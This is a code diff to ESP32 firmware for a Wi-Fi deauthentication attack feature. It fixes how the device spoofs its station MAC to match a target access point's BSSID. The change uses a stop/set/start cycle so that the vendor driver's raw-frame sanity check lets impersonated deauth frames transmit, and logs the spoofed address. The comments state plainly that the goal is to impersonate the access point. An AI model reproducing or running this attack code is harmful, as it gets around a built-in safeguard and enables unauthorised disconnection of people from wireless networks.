@@ -216,16 +216,19 @@ void feat_wifi_deauth(void)
     }
 
     /* Spoof our STA MAC to match the target BSSID so esp_wifi_80211_tx
-     * passes the stock ESP-IDF blob's `ieee80211_raw_frame_sanity_check`.
-     * That check rejects any frame whose addr2 doesn't match the
-     * interface's MAC. Our deauth frames use addr2=BSSID (correct per
-     * 802.11 spec — we're impersonating the AP), so by setting the STA
-     * MAC = BSSID, addr2 matches and frames leave the antenna.
+     * passes the stock ESP-IDF blob's `ieee80211_raw_frame_sanity_check`
+     * (rejects any frame whose addr2 doesn't match the interface's MAC).
      *
-     * Save the real MAC first so we can restore on exit. */
+     * Critical: esp_wifi_set_mac() must be called while WiFi is STOPPED,
+     * not merely initialized. esp_wifi_stop -> set_mac -> esp_wifi_start. */
     uint8_t s_saved_mac[6];
     esp_wifi_get_mac(WIFI_IF_STA, s_saved_mac);
-    esp_wifi_set_mac(WIFI_IF_STA, s_target);
+    esp_wifi_stop();
+    esp_err_t mac_rc = esp_wifi_set_mac(WIFI_IF_STA, s_target);
+    esp_wifi_start();
+    Serial.printf("[deauth] set_mac %02X:%02X:%02X:%02X:%02X:%02X rc=%d\n",
+                  s_target[0], s_target[1], s_target[2],
+                  s_target[3], s_target[4], s_target[5], (int)mac_rc);
 
     /* Start promiscuous sniffer + inject. */
     esp_wifi_set_promiscuous(true);
@@ -296,8 +299,8 @@ void feat_wifi_deauth(void)
     s_running = false;
     delay(150);
     esp_wifi_set_promiscuous(false);
-    /* Restore our real STA MAC so other WiFi features don't inherit
-     * a spoofed identity (which would also make scans report our node
-     * as being on a different MAC). */
+    /* Restore real MAC — stop/set/start cycle required. */
+    esp_wifi_stop();
     esp_wifi_set_mac(WIFI_IF_STA, s_saved_mac);
+    esp_wifi_start();
 }
